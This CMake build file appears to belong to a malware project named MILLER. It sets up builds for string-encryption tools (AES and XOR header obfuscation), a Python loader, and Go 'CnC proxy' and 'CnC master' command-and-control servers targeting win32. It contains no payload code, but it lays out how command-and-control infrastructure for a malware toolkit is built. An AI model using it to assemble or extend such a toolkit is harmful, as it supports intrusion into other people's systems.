set(TOOLS_DIR tools)
set(HOST_TOOLS_SRCDIR ${TOOLS_DIR}/host)
set(HOST_TOOLS_BUILDDIR ${CMAKE_CURRENT_BINARY_DIR}/host-tools)
set(HOST_TOOLS_MK ${HOST_TOOLS_BUILDDIR}/Makefile)
set(HOST_TOOLS_MKSTAMP ${STAMP_DIR}/.host-tools-build)
set(HOST_TOOLS_SRCGOAPPS ${MILLER_SRCDIR}/${HOST_TOOLS_SRCDIR}/go)
set(HOST_TOOLS_CNCPROXY ${HOST_TOOLS_SRCGOAPPS}/cncproxy)
set(HOST_TOOLS_CNCMASTER ${HOST_TOOLS_SRCGOAPPS}/cncmaster)

set(CMAKE_ASM_NASM_OBJECT_FORMAT "win32")
set(CMAKE_ASM_NASM_COMPILER_ARG1 "-I${MILLER_SRCDIR}")
set(ASM_DIALECT "-NASM")
set(CMAKE_ASM${ASM_DIALECT}_SOURCE_FILE_EXTENSIONS nasm;asm)
enable_language(ASM_NASM)

set(CRYPT_FILEDIR ${MILLER_HDRDIR})
set(CRYPT_AESFILE ${CRYPT_FILEDIR}/aes_strings.h)
set(CRYPT_AESOUT ${MILLER_HDRDIR_CREATED}/aes_strings_gen.h)
set(CRYPT_AESOUT_STAMP ${STAMP_DIR}/.aes-strings-header-build)
set(CRYPT_XORFILE ${CRYPT_FILEDIR}/xor_strings.h)
set(CRYPT_XOROUT ${MILLER_HDRDIR_CREATED}/xor_strings_gen.h)
set(CRYPT_XOROUT_STAMP ${STAMP_DIR}/.xor-strings-header-build)

set(CRYPT_NAME hdr_crypt-host)
set(CRYPT_EXEC ${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${CRYPT_NAME})

set(PYLOAD_NAME pyloader)
set(PYLOAD_SO ${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${PYLOAD_NAME})

set(PYCRYPT_NAME pycrypt)
set(PYCRYPT_SO ${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${PYCRYPT_NAME})

set(STRINGS_NAME strings-host)
set(STRINGS_EXEC ${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${STRINGS_NAME})

set(CNCPROXY_NAME cncproxy-host)
set(CNCPROXY_EXEC ${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${CNCPROXY_NAME})

set(CNCMASTER_NAME cncmaster-host)
set(CNCMASTER_EXEC ${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${CNCMASTER_NAME})


# BUILD HOST TOOLS (hdr_crypt, file_crypt)
add_custom_command(OUTPUT ${HOST_TOOLS_MK} ${HOST_TOOLS_MKSTAMP}
  COMMAND ${CMAKE_COMMAND} -E make_directory ${HOST_TOOLS_BUILDDIR}
  COMMAND ${CMAKE_COMMAND} -E chdir ${HOST_TOOLS_BUILDDIR} ${CMAKE_COMMAND} -DMILLER_SRCDIR=${MILLER_SRCDIR} -DMILLER_HDRDIR=${MILLER_HDRDIR} -DMILLER_HDRDIR_CREATED=${MILLER_HDRDIR_CREATED} -DMILLER_TOOLSDIR=${MILLER_SRCDIR}/${TOOLS_DIR} -DPYTHON_INCDIR=${PYTHON_INCDIR} -DLOADER_ENDMARKER=${LOADER_ENDMARKER} -DINSTALL_DEST=${CMAKE_RUNTIME_OUTPUT_DIRECTORY} ${MILLER_SRCDIR}/${HOST_TOOLS_SRCDIR}
  COMMAND ${CMAKE_COMMAND} -E remove ${CRYPT_EXEC} ${PYLOAD_SO} ${PYCRYPT_SO} ${STRINGS_EXEC}
  COMMAND ${CMAKE_COMMAND} -E touch ${HOST_TOOLS_MKSTAMP}
)
add_custom_command(OUTPUT ${CRYPT_EXEC} /force-run
  COMMAND ${CMAKE_MAKE_PROGRAM} -C ${HOST_TOOLS_BUILDDIR} ${CRYPT_NAME}-install
)
add_custom_command(OUTPUT ${PYLOAD_SO} /force-run
  COMMAND ${CMAKE_MAKE_PROGRAM} -C ${HOST_TOOLS_BUILDDIR} ${PYLOAD_NAME}-install
)
add_custom_command(OUTPUT ${PYCRYPT_SO} /force-run
  COMMAND ${CMAKE_MAKE_PROGRAM} -C ${HOST_TOOLS_BUILDDIR} ${PYCRYPT_NAME}-install
)
add_custom_command(OUTPUT ${PYHTTP_SO} /force-run
  COMMAND ${CMAKE_MAKE_PROGRAM} -C ${HOST_TOOLS_BUILDDIR} ${PYHTTP_NAME}-install
)
add_custom_command(OUTPUT ${STRINGS_EXEC} /force-run
  COMMAND ${CMAKE_MAKE_PROGRAM} -C ${HOST_TOOLS_BUILDDIR} ${STRINGS_NAME}-install
)

add_custom_target(host-tools
  ALL
  DEPENDS ${HOST_TOOLS_MKSTAMP}
)
add_custom_target(hdrcrypt
  ALL
  DEPENDS ${HOST_TOOLS_MKSTAMP} ${CRYPT_EXEC}
)
add_custom_target(pyloader
  ALL
  DEPENDS ${HOST_TOOLS_MKSTAMP} ${PYLOAD_SO}
)
add_custom_target(pycrypt
  ALL
  DEPENDS ${HOST_TOOLS_MKSTAMP} ${PYCRYPT_SO}
)
add_custom_target(strings
  ALL
  DEPENDS ${HOST_TOOLS_MKSTAMP} ${STRINGS_EXEC}
)

if (BUILD_CNCPROXY)
add_custom_target(
  cncproxy
  COMMAND ${CMAKE_COMMAND} -E cmake_echo_color --cyan --bold "Building CnC proxy"
  COMMAND ${CMAKE_MAKE_PROGRAM} ${CNCPROXY_NAME}-install IS_GCCGO=1 GOCC=${HOSTGO} INSTALL=install DESTDIR=${HOST_TOOLS_BUILDDIR}
  WORKING_DIRECTORY ${HOST_TOOLS_CNCPROXY}
)
else()
add_custom_target(
  cncproxy
  COMMAND ${CMAKE_COMMAND} -E cmake_echo_color --red --bold "Not building CnC proxy: disabled"
)
endif()

if (BUILD_CNCMASTER)
add_custom_target(
  cncmaster
  COMMAND ${CMAKE_COMMAND} -E cmake_echo_color --cyan --bold "Building CnC master"
  COMMAND ${CMAKE_MAKE_PROGRAM} ${CNCMASTER_NAME}-install IS_GCCGO=1 GOCC=${HOSTGO} INSTALL=install DESTDIR=${HOST_TOOLS_BUILDDIR}
  WORKING_DIRECTORY ${HOST_TOOLS_CNCMASTER}
)
else()
add_custom_target(
  cncmaster
  COMMAND ${CMAKE_COMMAND} -E cmake_echo_color --red --bold "Not building CnC master: disabled"
)
endif()

add_dependencies(strings pycrypt cryptout_xor)
add_dependencies(pycrypt pyloader)
add_dependencies(pyloader hdrcrypt)
add_dependencies(hdrcrypt cncmaster)
add_dependencies(cncmaster cncproxy host-tools)
